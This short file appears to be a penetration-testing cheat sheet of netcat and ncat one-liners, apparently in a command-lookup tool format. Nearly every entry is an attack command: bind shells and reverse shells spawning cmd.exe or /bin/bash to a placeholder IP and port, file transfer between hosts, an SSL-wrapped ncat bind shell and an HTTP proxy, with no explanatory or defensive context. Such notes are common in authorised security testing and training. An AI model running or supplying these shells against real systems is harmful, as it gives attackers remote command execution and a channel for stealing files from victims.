# netcat

% nc, netcat

## nc setup listener
```
nc -nlvp <lport>
```

## nc bind shell windows
```
nc -nlvp <port> -e cmd.exe
```

## nc bind shell linux
```
nc -nlvp <port> -e /bin/bash
```

## nc reverse shell windows
```
nc -nv <ip> <port> -e cmd.exe
```

## nc reverse shell linux
```
nc -nv <ip> <port> -e /bin/bash
```

## nc transfert file - receiver
```
nc -nlvp <port> > <incomming_file>
```

## nc transfert file - sender
```
nc -nv <ip> <port> < <file_to_send>
```

# ncat

% ncat

## ncat bind shell ssl filtered
```
ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
```

## ncat bind shell ssl connection
```
ncat -v <ip> <port> --ssl
```

## ncat HTTP WEB proxy
```
ncat --listen --proxy-type http <port>
```

